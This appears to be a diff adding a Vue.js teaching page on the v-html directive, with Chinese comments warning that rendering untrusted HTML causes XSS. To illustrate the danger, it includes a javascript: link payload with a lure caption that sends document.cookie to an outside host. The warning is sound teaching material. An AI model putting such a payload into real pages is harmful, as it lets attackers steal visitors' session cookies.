@@ -1,0 +1,42 @@
+<!--
+ * @Author: Angelo
+ * @Date: 2024-03-19 14:11:50
+ * @version: 
+ * @Descripttion: 
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <script src="vue.js"></script>
+    <title>vue</title>
+    </style>
+  </head>
+  <body>
+    <div id="box">
+      
+      <!-- 双大括号会将数据解析成纯文本，而不是html，若想插入HTML，可以使用v-hmtl指令
+          注意：在网站上动态渲染html是非常危险的，因为容易造成xss（Cross-Site Scripting:跨站脚本攻击）漏洞。必须在内容可信的情况下使用v-html，并且永远不要使用用户提供的html内容
+      --> 
+      <div v-html="myhtml"></div>
+
+      <!-- 假设是钓鱼网站拿到你的cookie是不安全的 -->
+      <div v-html="mydangerInfo"></div>
+    </div>
+    <script>
+      //将obj进行提取出来，当作一个对象
+      var obj = {
+        data() {
+          return {
+            mydangerInfo:`<a href=javascript:location.href='http://www.baidu.com?cookie?'+document.cookie>点我没事的！</a>`,
+            myhtml:`<b>angelo</b>加粗了！`
+          };
+        },
+        methods: {},
+      };
+      var vm = Vue.createApp(obj).mount("#box");
+    </script>
+  </body>
+</html>
